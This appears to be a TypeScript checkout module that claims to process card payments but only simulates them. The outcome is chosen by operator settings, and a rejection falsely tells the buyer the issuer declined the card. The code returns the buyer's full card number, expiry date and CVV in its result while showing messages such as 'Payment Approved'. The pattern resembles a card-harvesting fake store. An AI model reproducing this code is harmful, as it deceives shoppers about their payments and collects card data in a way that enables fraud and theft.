
import { CardFormData } from '@/components/checkout/payment-methods/CardForm';
import { useToast } from '@/hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import { PaymentProcessorProps, PaymentResult } from '../../types';
import { detectCardBrand } from '../cardDetection';
import { simulatePayment } from '../../paymentSimulator';
import { DeviceType } from '@/types/order';
import { logger } from '@/utils/logger';
import { logCardProcessingDecisions } from '../cardProcessorLogs';
import { resolveManualStatus, isRejectedStatus } from '@/contexts/order/utils';

interface ProcessAutomaticPaymentParams {
  cardData: CardFormData;
  formState: any;
  settings: any;
  isSandbox: boolean;
  deviceType: DeviceType;
  setPaymentStatus?: (status: string) => void;
  setIsSubmitting: (isSubmitting: boolean) => void;
  setError: (error: string) => void;
  navigate: ReturnType<typeof useNavigate>;
  toast?: ReturnType<typeof useToast>['toast'];
  onSubmit?: (data: any) => Promise<any> | any;
}

interface AlertStyles {
  alertClass: string;
  iconClass: string;
  textClass: string;
}

const getAlertStyles = (): AlertStyles => {
  return {
    alertClass: "alert alert-info",
    iconClass: "lucide-info",
    textClass: "font-semibold"
  };
};

export const processAutomaticPayment = async ({
  cardData,
  formState,
  settings,
  isSandbox,
  deviceType,
  setPaymentStatus = () => {},
  setIsSubmitting,
  setError,
  navigate,
  toast,
  onSubmit
}: ProcessAutomaticPaymentParams): Promise<PaymentResult> => {
  try {
    logger.log("Automatic processing with settings:", {
      manualCardStatus: settings.manualCardStatus,
      isDigitalProduct: formState.isDigitalProduct,
      useCustomProcessing: formState.useCustomProcessing || false,
      productManualStatus: formState.custom_manual_status,
      globalManualStatus: settings.manualCardStatus
    });

    // Check if we should respect manual settings despite being in automatic mode
    // This allows product-specific or global manual settings to override automatic processing
    let resolvedStatus = 'CONFIRMED';

    // Decision logic for determining payment status
    const useCustomProcessing = formState.useCustomProcessing || false;
    const productManualStatus = formState.custom_manual_status;
    const globalManualStatus = settings.manualCardStatus;

    logCardProcessingDecisions(useCustomProcessing, productManualStatus, settings.manualCardProcessing, globalManualStatus);

    // If product has custom processing enabled, respect its status
    if (useCustomProcessing && productManualStatus) {
      resolvedStatus = resolveManualStatus(productManualStatus);
      logger.log("Using product-specific manual status:", resolvedStatus);
    }
    // If global manual processing is enabled, respect global status
    else if (settings.manualCardProcessing && globalManualStatus) {
      resolvedStatus = resolveManualStatus(globalManualStatus);
      logger.log("Using global manual status:", resolvedStatus);
    }

    // Processing decisions based on the resolved status
    if (resolvedStatus === 'PENDING') {
      logger.log("Payment set to pending based on manual settings");
    } else {
      logger.log("Payment automatically confirmed based on automatic settings");
    }

    // For declined payments, we should fail the transaction immediately
    if (resolvedStatus === 'REJECTED') {
      logger.log("Payment automatically declined based on manual settings");
      throw new Error('Pagamento recusado pela operadora');
    }

    // Simulate payment - Fix: passing a timeout number instead of boolean
    const paymentId = `card_${Date.now()}`;
    // The error was here - passing isSandbox (boolean) to simulatePayment which expects a number (timeout)
    // Changing to pass a numeric timeout value based on sandbox mode
    await simulatePayment(isSandbox ? 1500 : 1000);

    setPaymentStatus(resolvedStatus);

    // Detect card brand
    const brand = detectCardBrand(cardData.cardNumber);

    // Format the data for creating the order
    const orderData = {
      orderId: paymentId,
      productId: formState.productId,
      productName: formState.productName,
      productPrice: formState.productPrice,
      productSlug: formState.productSlug, // Include productSlug for redirection
      paymentMethod: 'card',
      paymentStatus: resolvedStatus,
      cardDetails: {
        brand,
        last4: cardData.cardNumber.slice(-4)
      }
    };

    // Call onSubmit and await result
    if (onSubmit) {
      await onSubmit(orderData);
      logger.log("Order created successfully");
    }

    // Determine where to navigate based on payment status
    const getRedirectPath = () => {
      if (resolvedStatus === 'REJECTED') {
        logger.log(`Redirecting to failure page due to status: ${resolvedStatus}`);
        return '/payment-failed';
      } else if (resolvedStatus === 'CONFIRMED') {
        logger.log(`Redirecting to success page due to status: ${resolvedStatus}`);
        return '/payment-success';
      } else {
        // If status is PENDING or any other, use success page but indicate it's in analysis
        logger.log(`Redirecting to success page with pending status: ${resolvedStatus}`);
        return '/payment-success';
      }
    };

    // Toast notification based on status
    if (toast) {
      if (resolvedStatus !== 'REJECTED') {
        toast({
          title: resolvedStatus === "CONFIRMED" ? "Payment Approved" : "Payment in Analysis",
          description: resolvedStatus === "CONFIRMED"
            ? "Your payment was successfully approved!"
            : "Your payment has been received and is being analyzed.",
          duration: 5000,
          variant: "default"
        });
      } else {
        toast({
          title: "Payment Declined",
          description: "Your payment was declined. Please try again.",
          variant: "destructive",
          duration: 5000,
        });
      }
    }

    // Navigate to appropriate page
    const redirectPath = getRedirectPath();
    logger.log(`Redirecting to: ${redirectPath} with state:`, orderData);

    navigate(redirectPath, {
      state: { orderData }
    });

    return {
      success: true,
      paymentId,
      method: 'card', // Fixed: using literal 'card' instead of string
      status: resolvedStatus,
      timestamp: new Date().toISOString(),
      cardNumber: cardData.cardNumber,
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv,
      brand
    };
  } catch (error) {
    logger.error("Error in automatic card processing:", error);
    setError(error instanceof Error ? error.message : 'Falha ao processar pagamento');
    setIsSubmitting(false);

    // Navigate to failure page for persistent errors
    navigate('/payment-failed', {
      state: {
        productName: formState.productName,
        productId: formState.productId,
        productSlug: formState.productSlug,
        productPrice: formState.productPrice,
        error: error instanceof Error ? error.message : 'Falha ao processar pagamento'
      }
    });

    return {
      success: false,
      error: 'Falha ao processar pagamento',
      method: 'card', // Fixed: using literal 'card' instead of string
      status: 'FAILED',
      timestamp: new Date().toISOString()
    };
  }
};

// Exports para compatibilidade
export default processAutomaticPayment;
